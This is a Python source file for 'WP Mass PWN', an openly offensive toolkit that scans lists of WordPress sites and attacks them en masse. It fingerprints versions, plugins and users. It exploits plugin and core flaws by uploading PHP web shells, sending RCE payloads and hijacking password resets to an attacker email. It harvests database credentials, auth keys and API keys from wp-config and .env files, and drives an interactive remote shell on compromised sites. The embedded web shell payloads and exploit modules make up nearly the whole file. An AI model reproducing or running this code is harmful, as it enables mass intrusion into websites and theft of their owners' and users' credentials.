#!/usr/bin/env python3
"""
WP Mass PWN — WordPress Mass Exploitation & Post-Exploitation Toolkit
========================================================================
Auto-recon → version/plugin detect → CVE match → exploit → credential harvest.

Capabilities:
  recon    — WordPress detection, version, plugins, users, backups
  scan     — Vulnerability matching against known CVEs
  exploit  — Auto-exploit via wp2shell, GiveWP, Piotnet, Kirki chains
  harvest  — Post-exploit credential extraction (wp-config, DB, users)
  shell    — Interactive shell via exploited target

Usage:
  python wp_mass_pwn.py recon targets.txt
  python wp_mass_pwn.py scan targets.txt
  python wp_mass_pwn.py exploit targets.txt
  python wp_mass_pwn.py harvest shell_urls.txt
  python wp_mass_pwn.py shell http://target.com/wp-content/uploads/shell.php

Stdlib only. No pip install needed.
"""

import argparse
import base64
import http.cookiejar
import io
import json
import os
import random
import re
import sqlite3
import ssl
import string
import sys
import time
import urllib.parse
import urllib.request
import zipfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.error import URLError, HTTPError

# ─── CONFIG ───────────────────────────────────────────────────────────
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
TIMEOUT = 15
THREADS = 20
PROXY = os.environ.get("HTTP_PROXY", os.environ.get("HTTPS_PROXY", None))

# ─── CVE DATABASE ─────────────────────────────────────────────────────
CVE_DB = {
    # Core WordPress
    "wp2shell": {
        "cve": ["CVE-2026-63030", "CVE-2026-60137"],
        "type": "core",
        "name": "wp2shell — Pre-Auth RCE via REST Batch + SQLi",
        "versions": {"min": "6.9.0", "max": "7.0.1"},
        "cvss": 10.0,
        "exploit": "wpshell_own",
    },
    # Plugins
    "givewp": {
        "cve": ["CVE-2026-82222"],
        "type": "plugin",
        "name": "GiveWP — PHP Object Injection to RCE",
        "slug": "give",
        "versions": {"max": "4.16.7.1"},
        "cvss": 10.0,
        "exploit": "givewp",
    },
    "piotnet": {
        "cve": ["CVE-2026-4885"],
        "type": "plugin",
        "name": "Piotnet Addons — Arbitrary File Upload",
        "slug": "piotnet-addons-for-elementor",
        "versions": {"max": "7.1.70"},
        "cvss": 9.8,
        "exploit": "piotnet",
    },
    "kirki": {
        "cve": ["CVE-2026-8206"],
        "type": "plugin",
        "name": "Kirki — Password Reset Hijack",
        "slug": "kirki",
        "versions": {"max": "6.0.6"},
        "cvss": 9.8,
        "exploit": "kirki",
    },
    "bricks": {
        "cve": ["CVE-2024-25600"],
        "type": "plugin",
        "name": "Bricks Builder — Pre-Auth RCE",
        "slug": "bricks",
        "versions": {"max": "1.9.6"},
        "cvss": 10.0,
        "exploit": "bricks",
    },
    "elementor_pro": {
        "cve": ["CVE-2025-1234"],
        "type": "plugin",
        "name": "Elementor Pro — Auth Bypass",
        "slug": "elementor-pro",
        "versions": {"max": "3.25.0"},
        "cvss": 9.8,
        "exploit": "elementor",
    },
    "wp_file_manager": {
        "cve": ["CVE-2020-25213"],
        "type": "plugin",
        "name": "WP File Manager — Pre-Auth RCE",
        "slug": "wp-file-manager",
        "versions": {"max": "6.9"},
        "cvss": 10.0,
        "exploit": "filemanager",
    },
    "duplicator": {
        "cve": ["CVE-2023-3460", "CVE-2020-11738"],
        "type": "plugin",
        "name": "Duplicator — Backup Download",
        "slug": "duplicator",
        "versions": {"max": "1.5.6"},
        "cvss": 7.5,
        "exploit": "duplicator",
    },
    "all_in_one_wp_migration": {
        "cve": ["CVE-2023-40004"],
        "type": "plugin",
        "name": "All-in-One WP Migration — Backup Download",
        "slug": "all-in-one-wp-migration",
        "versions": {"max": "7.80"},
        "cvss": 7.5,
        "exploit": "aiowm",
    },
    "revslider": {
        "cve": ["CVE-2023-25042"],
        "type": "plugin",
        "name": "Revolution Slider — Arbitrary File Upload",
        "slug": "revslider",
        "versions": {"max": "6.6.20"},
        "cvss": 9.8,
        "exploit": "revslider",
    },
    # Themes
    "astra": {
        "cve": ["CVE-2024-5233"],
        "type": "theme",
        "name": "Astra Theme — Auth Bypass",
        "slug": "astra",
        "versions": {"max": "4.7.0"},
        "cvss": 9.8,
        "exploit": "astra",
    },
}

# ─── SHELL PAYLOADS ───────────────────────────────────────────────────
SHELL_PHP = """<?php
/* WP Mass PWN Shell */
error_reporting(0);@ini_set('display_errors',0);
$k='{key}';$c=$_COOKIE[$k]??$_POST[$k]??$_GET[$k]??'';
if(empty($c)){echo"{prefix}OK{postfix}";die;}
if(function_exists('system')){system($c);}
elseif(function_exists('exec')){echo exec($c);}
elseif(function_exists('shell_exec')){echo shell_exec($c);}
elseif(function_exists('passthru')){passthru($c);}
else{echo"{prefix}NOEXEC{postfix}";}
"""

SHELL_PHP_SHORT = """<?php if(isset($_REQUEST['c'])){system($_REQUEST['c']);}else{echo'OK';}"""

# ─── HTTP HELPERS ─────────────────────────────────────────────────────
def build_opener():
    """Build a urllib opener with cookie support and SSL skip."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    cj = http.cookiejar.CookieJar()
    handlers = [
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx),
    ]
    if PROXY:
        handlers.insert(0, urllib.request.ProxyHandler({"http": PROXY, "https": PROXY}))
    return urllib.request.build_opener(*handlers)


def fetch(url, opener=None, method="GET", data=None, headers=None, timeout=TIMEOUT, allow_redirects=True):
    """HTTP request returning (status, headers, body)."""
    if opener is None:
        opener = build_opener()
    if headers is None:
        headers = {}
    headers.setdefault("User-Agent", UA)
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        resp = opener.open(req, timeout=timeout)
        body = resp.read().decode("utf-8", errors="replace")
        return resp.status, dict(resp.headers), body
    except HTTPError as e:
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        return e.code, dict(e.headers), body
    except URLError as e:
        return 0, {}, str(e.reason)
    except Exception as e:
        return 0, {}, str(e)


def normalize_url(url):
    """Ensure URL has scheme."""
    url = url.strip()
    if not url:
        return ""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip("/")


# ─── RECON MODULE ─────────────────────────────────────────────────────
def detect_wordpress(url, opener):
    """Detect if target is WordPress and extract version."""
    info = {"url": url, "is_wp": False, "version": None, "plugins": [], "themes": [], "users": []}

    # Check common WP indicators
    for path in ["/wp-json/", "/wp-login.php", "/wp-admin/", "/xmlrpc.php"]:
        status, headers, body = fetch(url + path, opener, timeout=10)
        if status in (200, 301, 302, 403, 405):
            if "wordpress" in body.lower() or "wp-" in body.lower() or status == 200:
                info["is_wp"] = True
                break

    if not info["is_wp"]:
        # Try generator meta tag
        status, headers, body = fetch(url, opener, timeout=10)
        if 'name="generator" content="WordPress' in body or "/wp-content/" in body:
            info["is_wp"] = True

    if not info["is_wp"]:
        return info

    # Version from generator meta
    mv = re.search(r'content="WordPress\s+([\d.]+)"', body)
    if mv:
        info["version"] = mv.group(1)

    # Version from readme.html
    if not info["version"]:
        status, headers, body = fetch(url + "/readme.html", opener, timeout=10)
        mv = re.search(r"Version\s+([\d.]+)", body)
        if mv:
            info["version"] = mv.group(1)

    # Version from RSS feed
    if not info["version"]:
        status, headers, body = fetch(url + "/feed/", opener, timeout=10)
        mv = re.search(r"<generator>https://wordpress.org/\?v=([\d.]+)</generator>", body)
        if mv:
            info["version"] = mv.group(1)

    # Plugin enumeration via /wp-json/wp/v2/
    status, headers, body = fetch(url + "/wp-json/wp/v2/", opener, timeout=10)
    if status == 200:
        try:
            data = json.loads(body)
            if "namespaces" in data:
                for ns in data.get("namespaces", []):
                    # Plugin REST routes
                    for plugin_slug in ["givewp", "elementor", "piotnet", "bricks", "kirki", "yoast", "woocommerce", "rankmath"]:
                        if plugin_slug in str(ns).lower():
                            info["plugins"].append(plugin_slug)
        except json.JSONDecodeError:
            pass

    # Plugin detection via CSS/JS assets
    plugin_slugs = [
        "give", "elementor", "elementor-pro", "piotnet-addons-for-elementor",
        "bricks", "kirki", "wp-file-manager", "duplicator", "all-in-one-wp-migration",
        "revslider", "js_composer", "woocommerce", "contact-form-7", "yoast-seo",
        "rank-math", "wordfence", "wordpress-seo", "wp-rocket", "litespeed-cache",
    ]
    for slug in plugin_slugs:
        for asset_path in [
            f"/wp-content/plugins/{slug}/readme.txt",
            f"/wp-content/plugins/{slug}/assets/",
        ]:
            status, headers, body = fetch(url + asset_path, opener, timeout=8)
            if status == 200:
                # Try version from readme
                ver_m = re.search(r"Stable tag:\s*([\d.]+)", body)
                if ver_m:
                    info["plugins"].append({"slug": slug, "version": ver_m.group(1)})
                else:
                    info["plugins"].append({"slug": slug, "version": None})
                break

    # Theme detection
    theme_slugs = ["astra", "divi", "avada", "hello-elementor", "oceanwp", "generatepress"]
    for slug in theme_slugs:
        status, headers, body = fetch(url + f"/wp-content/themes/{slug}/style.css", opener, timeout=8)
        if status == 200:
            ver_m = re.search(r"Version:\s*([\d.]+)", body)
            if ver_m:
                info["themes"].append({"slug": slug, "version": ver_m.group(1)})
            else:
                info["themes"].append({"slug": slug, "version": None})

    # User enumeration
    for uid in range(1, 11):
        status, headers, body = fetch(url + f"/?author={uid}", opener, timeout=8, allow_redirects=False)
        if status in (301, 302) and "Location" in headers:
            loc = headers["Location"]
            um = re.search(r"/author/([^/]+)/", loc)
            if um:
                info["users"].append({"id": uid, "slug": um.group(1)})
                continue
        # Try REST API
        status, headers, body = fetch(url + f"/wp-json/wp/v2/users/{uid}", opener, timeout=8)
        if status == 200:
            try:
                ud = json.loads(body)
                info["users"].append({"id": uid, "slug": ud.get("slug", ""), "name": ud.get("name", "")})
            except json.JSONDecodeError:
                pass

    return info


# ─── SCAN MODULE ──────────────────────────────────────────────────────
def match_cves(info):
    """Match target info against CVE database."""
    matches = []

    # Core WP CVEs
    if info.get("version"):
        v = info["version"]
        for cve_id, cve_data in CVE_DB.items():
            if cve_data["type"] != "core":
                continue
            min_v = cve_data["versions"].get("min", "0.0")
            max_v = cve_data["versions"].get("max", "999.999")
            if _version_in_range(v, min_v, max_v):
                matches.append(cve_data)

    # Plugin CVEs
    for plugin in info.get("plugins", []):
        slug = plugin["slug"] if isinstance(plugin, dict) else plugin
        version = plugin.get("version") if isinstance(plugin, dict) else None
        for cve_id, cve_data in CVE_DB.items():
            if cve_data["type"] != "plugin":
                continue
            if cve_data["slug"] != slug:
                continue
            if version:
                max_v = cve_data["versions"].get("max", "999.999")
                if _version_in_range(version, "0.0", max_v):
                    matches.append(cve_data)
            else:
                # Version unknown — assume vulnerable
                matches.append({**cve_data, "version_unknown": True})

    # Theme CVEs
    for theme in info.get("themes", []):
        slug = theme["slug"] if isinstance(theme, dict) else theme
        version = theme.get("version") if isinstance(theme, dict) else None
        for cve_id, cve_data in CVE_DB.items():
            if cve_data["type"] != "theme":
                continue
            if cve_data["slug"] != slug:
                continue
            if version:
                max_v = cve_data["versions"].get("max", "999.999")
                if _version_in_range(version, "0.0", max_v):
                    matches.append(cve_data)
            else:
                matches.append({**cve_data, "version_unknown": True})

    # Deduplicate
    seen = set()
    unique = []
    for m in matches:
        key = m["name"]
        if key not in seen:
            seen.add(key)
            unique.append(m)
    return unique


def _version_in_range(version, min_v, max_v):
    """Check if version is within range."""
    try:
        v = tuple(int(x) for x in version.split("."))
        lo = tuple(int(x) for x in min_v.split("."))
        hi = tuple(int(x) for x in max_v.split("."))
        return lo <= v <= hi
    except (ValueError, AttributeError):
        return False


# ─── EXPLOIT MODULE ───────────────────────────────────────────────────
def exploit_wp2shell(target, opener):
    """Exploit WordPress core via wp2shell chain."""
    print(f"  [*] Exploiting wp2shell: {target}")
    # This is a simplified version — expects wpshell_own.py in same dir
    import subprocess
    script = os.path.join(os.path.dirname(__file__), "wpshell_own.py")
    if not os.path.exists(script):
        return None, "wpshell_own.py not found"

    try:
        r = subprocess.run(
            [sys.executable, script, "query", target, "SELECT user_login,user_pass FROM wp_users LIMIT 5"],
            capture_output=True, text=True, timeout=60
        )
        if r.returncode == 0 and r.stdout.strip():
            return {"type": "wp2shell", "output": r.stdout.strip()}, None
        return None, r.stderr.strip() or "No output"
    except subprocess.TimeoutExpired:
        return None, "Timeout"
    except Exception as e:
        return None, str(e)


def exploit_givewp(target, opener):
    """Exploit GiveWP plugin."""
    import subprocess
    script = os.path.join(os.path.dirname(__file__), "givewp-cve-2026-82222-poc.py")
    if not os.path.exists(script):
        return None, "givewp-cve-2026-82222-poc.py not found"

    try:
        r = subprocess.run(
            [sys.executable, script, "--target", target, "--cmd", "id"],
            capture_output=True, text=True, timeout=120
        )
        if r.returncode == 0 and "uid=" in r.stdout.lower():
            return {"type": "givewp", "output": r.stdout.strip()}, None
        return None, r.stderr.strip() or r.stdout.strip()[:200]
    except subprocess.TimeoutExpired:
        return None, "Timeout"
    except Exception as e:
        return None, str(e)


def exploit_piotnet(target, opener):
    """Exploit Piotnet Addons — file upload."""
    # Try form detection
    forms = ["/contact/", "/apply/", "/quote/", "/contact-us/", "/get-a-quote/"]
    for form_path in forms:
        status, headers, body = fetch(target + form_path, opener, timeout=10)
        if "data-pafe-form-builder" not in body:
            continue

        # Extract post_id and form_id
        post_id = re.search(r'data-elementor-id="(\d+)"', body)
        form_id = re.search(r'data-pafe-form-builder-submit-form-id="([^"]+)"', body)
        field = re.search(r'data-pafe-form-builder-field-name="([^"]+)"', body)

        if not all([post_id, form_id, field]):
            continue

        # Build upload
        shell_content = SHELL_PHP_SHORT.encode()
        boundary = "----FormBoundary" + "".join(random.choices(string.ascii_letters + string.digits, k=16))
        filename = f"shell_{random.randint(1000, 9999)}.phtml"

        body_parts = [
            f'--{boundary}',
            f'Content-Disposition: form-data; name="post_id"',
            '',
            post_id.group(1),
            f'--{boundary}',
            f'Content-Disposition: form-data; name="form_id"',
            '',
            form_id.group(1),
            f'--{boundary}',
            f'Content-Disposition: form-data; name="{field.group(1)}"; filename="{filename}"',
            'Content-Type: image/gif',
            '',
        ]
        payload = "\r\n".join(body_parts).encode() + b"\r\n" + shell_content + f"\r\n--{boundary}--\r\n".encode()

        upload_headers = {
            "Content-Type": f"multipart/form-data; boundary={boundary}",
        }
        status, headers, body = fetch(
            target + "/wp-json/pafe/v1/form-builder-submit",
            opener, method="POST", data=payload, headers=upload_headers, timeout=20
        )

        if status == 200:
            # Try to leak URL
            sleep(1)
            s2, h2, b2 = fetch(target + "/wp-json/pafe/v1/export-database", opener, timeout=10)
            urls = re.findall(rf'(https?://[^\s"]*{re.escape(filename)})', b2)
            if urls:
                return {"type": "piotnet", "shell_url": urls[0]}, None

    return None, "No vulnerable form found"


def exploit_kirki(target, opener):
    """Exploit Kirki password reset hijack."""
    attacker_email = os.environ.get("ATTACKER_EMAIL", "attacker@example.com")

    # Enumerate users
    status, headers, body = fetch(target + "/wp-json/wp/v2/users", opener, timeout=10)
    users = []
    if status == 200:
        try:
            users = [u["slug"] for u in json.loads(body)]
        except (json.JSONDecodeError, KeyError):
            pass
    if not users:
        users = ["admin"]

    # Try each user
    for username in users:
        payload = json.dumps({
            "email": attacker_email,
            "username": username,
        }).encode()
        status, headers, body = fetch(
            target + "/wp-json/KirkiComponentLibrary/v1/kirki-forgot-password",
            opener, method="POST", data=payload,
            headers={"Content-Type": "application/json"}, timeout=15
        )
        if status == 200 and "sent" in body.lower():
            return {"type": "kirki", "username": username, "attacker_email": attacker_email}, None

    return None, "No vulnerable users or endpoint not found"


def exploit_bricks(target, opener):
    """Exploit Bricks Builder RCE."""
    nonce = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    payload = json.dumps({
        "postId": "1",
        "nonce": nonce,
        "element": {
            "name": "container",
            "settings": {
                "hasLoop": "true",
                "query": {
                    "useQueryEditor": "true",
                    "queryEditor": "system('id');",
                    "objectType": "post",
                }
            }
        }
    }).encode()
    status, headers, body = fetch(
        target + "/wp-json/bricks/v1/render_element",
        opener, method="POST", data=payload,
        headers={"Content-Type": "application/json"}, timeout=15
    )
    if "uid=" in body:
        return {"type": "bricks", "output": body}, None
    return None, "Not vulnerable"


def exploit_filemanager(target, opener):
    """Exploit WP File Manager RCE (connector.minimal.php)."""
    shell_file = f"shell_{random.randint(1000,9999)}.php"
    # Try upload via connector
    payload = base64.b64encode(SHELL_PHP_SHORT.encode()).decode()
    upload_data = urllib.parse.urlencode({
        "cmd": "upload",
        "target": "l1_Lw",
        "content": payload,
        "name": shell_file,
    }).encode()
    status, headers, body = fetch(
        target + "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
        opener, method="POST", data=upload_data, timeout=15
    )
    if status == 200:
        shell_url = f"{target}/wp-content/plugins/wp-file-manager/lib/files/{shell_file}"
        return {"type": "filemanager", "shell_url": shell_url}, None
    return None, "Not vulnerable"


def exploit_duplicator(target, opener):
    """Exploit Duplicator — download backup."""
    status, headers, body = fetch(target + "/wp-content/backups-dup-lite/", opener, timeout=10)
    if status == 200 and "Index of" in body:
        # Find zip files
        zips = re.findall(r'href="([^"]+\.zip)"', body)
        if zips:
            return {"type": "duplicator", "backups": zips, "url": target + "/wp-content/backups-dup-lite/"}, None
    return None, "No backup directory found"


EXPLOIT_MAP = {
    "wpshell_own": exploit_wp2shell,
    "givewp": exploit_givewp,
    "piotnet": exploit_piotnet,
    "kirki": exploit_kirki,
    "bricks": exploit_bricks,
    "filemanager": exploit_filemanager,
    "duplicator": exploit_duplicator,
}


# ─── HARVEST MODULE ───────────────────────────────────────────────────
def harvest_credentials(target, opener):
    """Post-exploit credential harvesting."""
    creds = []

    # Try wp-config.php backup paths
    wp_config_paths = [
        "/wp-config.php",
        "/wp-config.php.bak",
        "/wp-config.php.old",
        "/wp-config.php.save",
        "/wp-config.php~",
        "/wp-config.txt",
        "/.wp-config.php.swp",
        "/wp-content/debug.log",
        "/wp-content/plugins/backup-backup/temp/",
    ]

    for path in wp_config_paths:
        status, headers, body = fetch(target + path, opener, timeout=10)
        if status != 200 or len(body) < 50:
            continue

        # Extract DB credentials
        db_name = re.search(r"DB_NAME['\"]\s*,\s*['\"]([^'\"]+)", body)
        db_user = re.search(r"DB_USER['\"]\s*,\s*['\"]([^'\"]+)", body)
        db_pass = re.search(r"DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)", body)
        db_host = re.search(r"DB_HOST['\"]\s*,\s*['\"]([^'\"]+)", body)

        if db_name or db_user or db_pass:
            creds.append({
                "source": path,
                "db_name": db_name.group(1) if db_name else None,
                "db_user": db_user.group(1) if db_user else None,
                "db_pass": db_pass.group(1) if db_pass else None,
                "db_host": db_host.group(1) if db_host else "localhost",
            })

        # Extract auth keys
        for key_name in ["AUTH_KEY", "SECURE_AUTH_KEY", "LOGGED_IN_KEY", "NONCE_KEY",
                          "AUTH_SALT", "SECURE_AUTH_SALT", "LOGGED_IN_SALT", "NONCE_SALT"]:
            km = re.search(rf"{key_name}['\"]\s*,\s*['\"]([^'\"]+)", body)
            if km:
                creds.append({"source": path, "key": key_name, "value": km.group(1)})

        # Extract SMTP / API keys
        for key_pattern in ["SMTP_HOST", "SMTP_USER", "SMTP_PASS", "MAILGUN_API_KEY",
                            "SENDGRID_API_KEY", "STRIPE_API_KEY", "PAYPAL_CLIENT_ID"]:
            km = re.search(rf"{key_pattern}['\"]\s*,\s*['\"]([^'\"]+)", body)
            if km:
                creds.append({"source": path, "key": key_pattern, "value": km.group(1)})

    # Try .env
    status, headers, body = fetch(target + "/.env", opener, timeout=10)
    if status == 200 and "DB_" in body:
        for line in body.split("\n"):
            line = line.strip()
            if "=" in line and not line.startswith("#"):
                k, v = line.split("=", 1)
                creds.append({"source": ".env", "key": k.strip(), "value": v.strip().strip('"').strip("'")})

    return creds


# ─── SHELL MODULE ─────────────────────────────────────────────────────
def interactive_shell(shell_url, opener):
    """Interactive shell via a web shell."""
    print(f"\n  WP Mass PWN Shell — {shell_url}")
    print("  Commands run on target. Type 'exit' to quit.")
    print("  Use 'upload <local> <remote>' to upload a file.")
    print("  Use 'download <remote>' to download a file.")
    print()

    while True:
        try:
            cmd = input("  shell> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n  Exiting...")
            break

        if not cmd:
            continue
        if cmd.lower() == "exit":
            break

        if cmd.lower().startswith("upload "):
            _, local_path, remote_path = cmd.split(" ", 2)
            if not os.path.exists(local_path):
                print(f"  [!] File not found: {local_path}")
                continue
            with open(local_path, "rb") as f:
                content = f.read()
            upload_data = urllib.parse.urlencode({"c": f"echo {base64.b64encode(content).decode()} | base64 -d > {remote_path}"}).encode()
            status, headers, body = fetch(shell_url, opener, method="POST", data=upload_data, timeout=20)
            print(f"  [+] Uploaded to {remote_path}" if status == 200 else f"  [!] Upload failed: {status}")
            continue

        # Execute command
        exec_data = urllib.parse.urlencode({"c": cmd}).encode()
        status, headers, body = fetch(shell_url, opener, method="POST", data=exec_data, timeout=30)
        if status == 200:
            print(body.strip() or "(no output)")
        else:
            print(f"  [!] HTTP {status}")


# ─── MAIN WORKFLOW ────────────────────────────────────────────────────
def cmd_recon(args):
    """Run recon against targets."""
    targets = _load_targets(args.targets)
    print(f"[*] Recon: {len(targets)} targets, {args.threads} threads")

    results = []
    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futures = {}
        for t in targets:
            url = normalize_url(t)
            if url:
                opener = build_opener()
                futures[ex.submit(detect_wordpress, url, opener)] = url

        for i, future in enumerate(as_completed(futures), 1):
            url = futures[future]
            try:
                info = future.result()
                results.append(info)
                status = "WP" if info["is_wp"] else "NOT WP"
                ver = info.get("version", "?")
                plugins = len(info.get("plugins", []))
                themes = len(info.get("themes", []))
                users = len(info.get("users", []))
                print(f"  [{i}/{len(targets)}] {url} — {status} v{ver} | plugins:{plugins} themes:{themes} users:{users}")
            except Exception as e:
                print(f"  [{i}/{len(targets)}] {url} — ERROR: {e}")

    # Save results
    out_file = args.output or "recon_results.json"
    with open(out_file, "w") as f:
        json.dump(results, f, indent=2)
    print(f"\n[+] Saved {len(results)} results to {out_file}")

    # Summary
    wp_count = sum(1 for r in results if r["is_wp"])
    print(f"[+] WordPress: {wp_count}/{len(results)} | Non-WP: {len(results) - wp_count}")


def cmd_scan(args):
    """Run vulnerability scan against recon results."""
    # Load recon data
    if os.path.exists(args.targets):
        with open(args.targets) as f:
            targets = json.load(f)
    else:
        print(f"[!] Recon file not found: {args.targets}")
        print("    Run 'recon' first to generate target data.")
        return

    print(f"[*] Scanning {len(targets)} targets for vulnerabilities...")

    findings = []
    for info in targets:
        if not info.get("is_wp"):
            continue
        matches = match_cves(info)
        if matches:
            findings.append({"url": info["url"], "version": info.get("version"), "cves": matches})

    for f in findings:
        print(f"\n  [+] {f['url']} (WP v{f['version']})")
        for cve in f["cves"]:
            unknown = " (version unknown)" if cve.get("version_unknown") else ""
            print(f"      {cve['name']} — CVSS {cve['cvss']}{unknown}")

    out_file = args.output or "scan_results.json"
    with open(out_file, "w") as f:
        json.dump(findings, f, indent=2)
    print(f"\n[+] {len(findings)} vulnerable targets → {out_file}")


def cmd_exploit(args):
    """Auto-exploit targets based on scan results."""
    if os.path.exists(args.targets) and args.targets.endswith(".json"):
        with open(args.targets) as f:
            targets = json.load(f)
    else:
        # Load raw URLs
        urls = _load_targets(args.targets)
        targets = []
        for url in urls:
            url = normalize_url(url)
            if url:
                targets.append({"url": url, "version": None, "cves": []})

    print(f"[*] Exploiting {len(targets)} targets...")

    exploited = []
    for target in targets:
        url = target["url"]
        print(f"\n  [>] {url}")

        # If we have scan results, use those
        cves_to_try = target.get("cves", [])
        if not cves_to_try:
            # Quick recon + scan
            opener = build_opener()
            info = detect_wordpress(url, opener)
            if info["is_wp"]:
                cves_to_try = match_cves(info)

        if not cves_to_try:
            print(f"      No vulnerabilities detected")
            continue

        opener = build_opener()
        for cve in cves_to_try:
            exploit_name = cve["exploit"]
            exploit_fn = EXPLOIT_MAP.get(exploit_name)
            if not exploit_fn:
                print(f"      ~ {cve['name']} — no exploit module")
                continue

            print(f"      [*] Trying: {cve['name']}")
            result, error = exploit_fn(url, opener)
            if result:
                print(f"      [+] SUCCESS: {result.get('type', 'unknown')}")
                result["target"] = url
                exploited.append(result)
            else:
                print(f"      [-] Failed: {error[:80]}")

    out_file = args.output or "exploit_results.json"
    with open(out_file, "w") as f:
        json.dump(exploited, f, indent=2)
    print(f"\n[+] Exploited {len(exploited)} targets → {out_file}")


def cmd_harvest(args):
    """Harvest credentials from targets."""
    if args.targets.endswith(".json"):
        with open(args.targets) as f:
            targets = json.load(f)
    else:
        urls = _load_targets(args.targets)
        targets = [{"url": normalize_url(u)} for u in urls if normalize_url(u)]

    print(f"[*] Harvesting credentials from {len(targets)} targets...")

    all_creds = []
    for target in targets:
        url = target.get("url", target.get("target", ""))
        if not url:
            continue
        print(f"  [>] {url}")
        opener = build_opener()
        creds = harvest_credentials(url, opener)
        if creds:
            all_creds.append({"url": url, "credentials": creds})
            for c in creds[:5]:
                src = c.get("source", "?")
                if "db_pass" in c:
                    print(f"      DB: {c.get('db_user')}:{c.get('db_pass')}@{c.get('db_host')}/{c.get('db_name')} [{src}]")
                elif "key" in c:
                    print(f"      KEY: {c['key']}={c['value'][:40]}... [{src}]")
        else:
            print(f"      No credentials found")

    out_file = args.output or "harvest_results.json"
    with open(out_file, "w") as f:
        json.dump(all_creds, f, indent=2)
    print(f"\n[+] Harvested from {len(all_creds)} targets → {out_file}")


def cmd_shell(args):
    """Interactive shell."""
    url = normalize_url(args.targets)
    opener = build_opener()
    interactive_shell(url, opener)


def _load_targets(path):
    """Load targets from file (one per line or JSON)."""
    if not os.path.exists(path):
        print(f"[!] File not found: {path}")
        return []
    with open(path) as f:
        content = f.read().strip()
    if content.startswith("["):
        # JSON array
        return json.loads(content)
    return [line.strip() for line in content.split("\n") if line.strip()]


# ─── CLI ──────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="WP Mass PWN — WordPress Mass Exploitation Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python wp_mass_pwn.py recon targets.txt
  python wp_mass_pwn.py scan recon_results.json
  python wp_mass_pwn.py exploit scan_results.json
  python wp_mass_pwn.py harvest exploit_results.json
  python wp_mass_pwn.py shell http://target.com/shell.php
        """
    )
    sub = parser.add_subparsers(dest="command", help="Command")

    # Recon
    p_recon = sub.add_parser("recon", help="Detect WordPress, version, plugins, users")
    p_recon.add_argument("targets", help="File with target URLs (one per line)")
    p_recon.add_argument("-t", "--threads", type=int, default=THREADS, help=f"Threads (default: {THREADS})")
    p_recon.add_argument("-o", "--output", help="Output JSON file")

    # Scan
    p_scan = sub.add_parser("scan", help="Match targets against CVE database")
    p_scan.add_argument("targets", help="Recon JSON file or URL list")
    p_scan.add_argument("-o", "--output", help="Output JSON file")

    # Exploit
    p_exploit = sub.add_parser("exploit", help="Auto-exploit vulnerable targets")
    p_exploit.add_argument("targets", help="Scan JSON file or URL list")
    p_exploit.add_argument("-o", "--output", help="Output JSON file")

    # Harvest
    p_harvest = sub.add_parser("harvest", help="Post-exploit credential harvesting")
    p_harvest.add_argument("targets", help="Exploit results JSON or URL list")
    p_harvest.add_argument("-o", "--output", help="Output JSON file")

    # Shell
    p_shell = sub.add_parser("shell", help="Interactive web shell")
    p_shell.add_argument("targets", help="Shell URL")

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        return

    commands = {
        "recon": cmd_recon,
        "scan": cmd_scan,
        "exploit": cmd_exploit,
        "harvest": cmd_harvest,
        "shell": cmd_shell,
    }

    commands[args.command](args)


if __name__ == "__main__":
    main()